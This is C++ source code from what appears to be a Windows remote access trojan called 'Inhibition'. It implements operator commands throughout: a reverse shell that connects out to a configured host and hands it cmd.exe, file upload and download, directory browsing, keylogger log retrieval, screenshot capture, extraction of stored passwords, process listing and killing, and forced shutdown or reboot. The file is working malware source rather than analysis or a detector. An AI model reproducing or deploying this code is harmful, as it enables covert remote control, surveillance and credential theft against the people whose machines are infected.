#include <winsock2.h>
#include <windows.h>

#include <string>
#include <fstream>
#include <sstream>
using namespace std;

#include "system/ProcessManager.hpp"
#include "system/File.hpp"
using namespace System;

#include <blaspheme/transfer/FileTransfer.hpp>
#include <blaspheme/Blaspheme.hpp>
using namespace Blaspheme;
using namespace Network;

#include "RemoteControlFunctions.hpp"
#include "InhibitionCore.hpp"
#include "ServerAbstractFunction.hpp"
#include "ProgramStart.hpp"
#include <malicious/Screenshot.hpp>
#include <malicious/Keylogger.hpp>
#include <malicious/Passwords.hpp>
#include <common/Log.hpp>
#include <system/System.hpp>
using namespace Malicious;

#define SCREENSHOT_FILENAME "capture.jpg"

namespace Inhibition
{

    void RemoteShell::operator()()
    {
        LOG << "RemoteShell : Started";
		
        SOCKADDR_IN sAddr;
        PROCESS_INFORMATION pi;
        STARTUPINFO si;

        memset( &si, 0, sizeof( si ) );
        si.cb = sizeof( si );
        si.wShowWindow = SW_HIDE;
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;

		LOG << "Reverse Shell on " + cinfo.ip + ":" + to_string(cinfo.port);
        sAddr.sin_addr.s_addr = inet_addr(cinfo.ip.c_str());
        sAddr.sin_port =  htons(cinfo.port);
        sAddr.sin_family = AF_INET;

        SOCKET c = WSASocket( AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0 );
		if(c == INVALID_SOCKET)
		{
			LOG << "Unable to open socket for RemoteShell.";
			return;
		}
        while(connect(c, (LPSOCKADDR)&sAddr, sizeof(sAddr)))
        {
            LOG << "Connection failed";
            Sleep(100);
        }
		
        si.hStdInput = (HANDLE)c;
        si.hStdOutput = (HANDLE)c;
        si.hStdError = (HANDLE)c;
        if(!CreateProcess( NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi ))
        {
			LOG << "Can't start cmd.exe for RemoteShell (CreateProcess failed) : "+to_string(GetLastError());
		}
		else
		{
			LOG << "Waiting for process to end";
			WaitForSingleObject( pi.hProcess, INFINITE );
			CloseHandle( pi.hProcess );
			CloseHandle( pi.hThread );
		}
        closesocket( c );
        LOG << "RemoteShell : Ended";
    }

    void StartDownload::operator()()
    {
        LOG << "StartDownload : Started";
        try
        {
			string path_file;
            session() >> path_file;
            LOG << "File to send is : " + path_file;
            Upload transfer(path_file, session().stream());
			transfer.addObserver(new LogTransfer);
            transfer.launch();
		}
        catch(FileNotFound&)
        {
            LOG << "File does not exist";
        }
        LOG << "StartDownload : Ended";
    }

    void StartUpload::operator()()
    {
        LOG << "StartUpload : Started";
        try
        {
			string path_file;
            session() >> path_file;
            LOG << "File will be received in : " + path_file;
            Download transfer(path_file, session().stream());
			transfer.addObserver(new LogTransfer);
            transfer.launch();
        }
        catch(FileNotFound&)
        {
            LOG << "File does not exist";
        }
        LOG << "StartUpload : Ended";
    }

    void BrowseFileTree::operator()()
    {
        LOG << "BrowseFileTree : Started";
        string directory_to_list;
        session() >> directory_to_list;

        // objets qui va lister les différents périphériques et répertoires
        FileListing lister;
        try
        {
            // s'il faut lister le repertoire racine, il faut appeler la fonction
            // de listes de périphériques
            if(directory_to_list == "\\")
            {
                string volumes = lister.get_logical_volumes();
                session() << volumes+FINISHED;
            }
            else
            {
                string directory_list = lister.get_directory_list(directory_to_list);
                if(directory_list.size())
                {
                    session() << directory_list+FINISHED;
                }
                else
                {
                    LOG << "Unable to read dir " + directory_to_list;
                    session() << FAILURE;
                }
            }
        }
        catch(ListingError&)
        {
            LOG << "Unable to list logic disks";
        }
        catch(FileNotFound&)
        {
            LOG << "The directory to list doest not exist";
        }
        catch(...)
        {
            LOG << "Unknown exception";
        }
        LOG << "BrowseFileTree : Ended";
    }

    void SendEmail::operator()()
    {
        LOG << "SendEmail : Started";
        LOG << "SendEmail : Finished";
    }

    void UninstallClient::operator()()
    {
        LOG << "Uninstall : Started";
        InhibitionCore::instance().uninstall();
        LOG << "Uninstall : Finished";
    }

    void KillClient::operator()()
    {
        LOG << "KillServer : Started";
        InhibitionCore::instance().exit();
        LOG << "KillServer : Finished";
    }

    void UpgradeClient::operator()()
    {
        LOG << "UpdateServer : Started";
        InhibitionCore::instance().upgrade();
        LOG << "UpdateServer : Finished";
    }

    void RebootClient::operator()()
    {
        LOG << "RebootInhibition : Started";
        SHELLEXECUTEINFO ShExecInfo;
        memset(&ShExecInfo, 0, sizeof(ShExecInfo));
        ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
        ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;
        ShExecInfo.hwnd = NULL;
        ShExecInfo.lpVerb = NULL;
        ShExecInfo.lpFile = InhibitionCore::instance().getInstallPath().c_str();
        ShExecInfo.lpParameters = NULL;
        ShExecInfo.lpDirectory = NULL;
        ShExecInfo.nShow = SW_SHOW;
        ShExecInfo.hInstApp = NULL;

        if(!ShellExecuteEx(&ShExecInfo))
        {
            LOG << "Unable to launch " << InhibitionCore::instance().getInstallPath();
        }
        else
        {
            LOG << "RebootInhibition : Finished";
            InhibitionCore::instance().exit();
        }
        LOG << "RebootInhibition : Ended";
    }

    void SendKeylog::operator()()
    {
        LOG << "SendKeylog : Started";
        try
        {
            Keylogger::instance().flush();

            // si le keylog est vide, on y met un message pour dire a l'utilisateur que rien n'a
            // encore été tapé
            if(!System::Size(Keylogger::instance().get_keylog_path()))
            {
                LOG << "Log file empty";
                session() << KEYLOG_EMPTY;
            }
            else
            {
                session() << SUCCESS;
                Upload upload (Keylogger::instance().get_keylog_path(), session().stream());
                upload.launch();
            }
        }
        catch(...)
        {
            LOG << "SendKeylog : error";
        }
        LOG << "SendKeylog : Finished";
    }

    void SendScreenshot::operator()()
    {
        LOG << "SendScreenshot : Started";
        try
        {
            int quality = 10;
            string buffer_quality;
            LOG << "Waiting quality";
            session() >> buffer_quality;
            from_string(buffer_quality, quality);
            LOG << "Quality : " + buffer_quality;
            LOG << "Screenshot taken in : " << SCREENSHOT_FILENAME;
            screenshooter.take(SCREENSHOT_FILENAME, quality);			
			LOG << "Sending screenshot";
            Upload upload(SCREENSHOT_FILENAME, session().stream());
			upload.addObserver(new LogTransfer);
            upload.launch();
            LOG << "Screenshot sent, deleting it";
			remove(SCREENSHOT_FILENAME);
		}
        catch(BadChecksum& )
        {
            LOG << "Checksum error";
        }
        catch(...)
        {
            LOG << "Unknown exception";
        }
        LOG << "SendScreenshot : Finished";
    }

    void SendPasswords::operator()()
    {
        LOG << "SendPasswords : Started";
        try
        {
			string passes = Malicious::decodeAllPasswords(',');
            if(passes.size())
            {
				LOG << "Sending passwords : " + passes;
                session() << passes;
            }
            else
            {
                session() << FINISHED;
			}
        }
        catch(Malicious::ErrorWhileRetrieving&)
        {
            session() << "MSN is not installed";
        }
		catch(...)
		{
			session() << "Unable to aggregate passwords";
		}
        LOG << "SendPasswords : Finished";
    }

    void SendProcessList::operator()()
    {
        LOG << "SendProcessList : Started";
        session() << System::ProcessManager::GetAllRunningProcess()+FINISHED;
        LOG << "SendProcessList : Ended";
    }

    void KillProcess::operator()()
    {
        LOG << "Inhibition Kill Process : Started";
        string buffer;
        session() >> buffer;
		LOG << "Process to kill : " + buffer;
        if(System::ProcessManager::KillProcess(buffer))
        {
			LOG << "Inhibition killed process";
            session() << SUCCESS;
        }
        else
        {
            LOG << "Unable to kill process";
            session() << FAILURE;
        }
        LOG << "Inhibition Kill Process : Finished";
    }

    void SendWindowsVersion::operator()()
    {
        LOG << "SendWindowsVersion : Started";
        LOG << "Sending system version : " << System::getSystemVersionString();
        session() << System::getSystemVersionString();
        LOG << "SendWindowsVersion : Finished";
    }

    void SendClientName::operator()()
    {
        LOG << "SendClientName : Started";
        session() << cinfo.name;
        LOG << "SendClientName : Finished";
    }

    void Shutdown::operator()()
    {
        LOG << "Shutting down";
        System::shutdown();
        InhibitionCore::instance().exit();
    }

    void Reboot::operator()()
    {
        LOG << "Rebooting";
        System::reboot();
        InhibitionCore::instance().exit();
    }

    void Logout::operator()()
    {
        LOG << "Logout";
        System::logout();
        InhibitionCore::instance().exit();
    }

    void Hibernate::operator()()
    {
        LOG << "Standby";
        System::hibernate();
    }

} /* Inhibition */
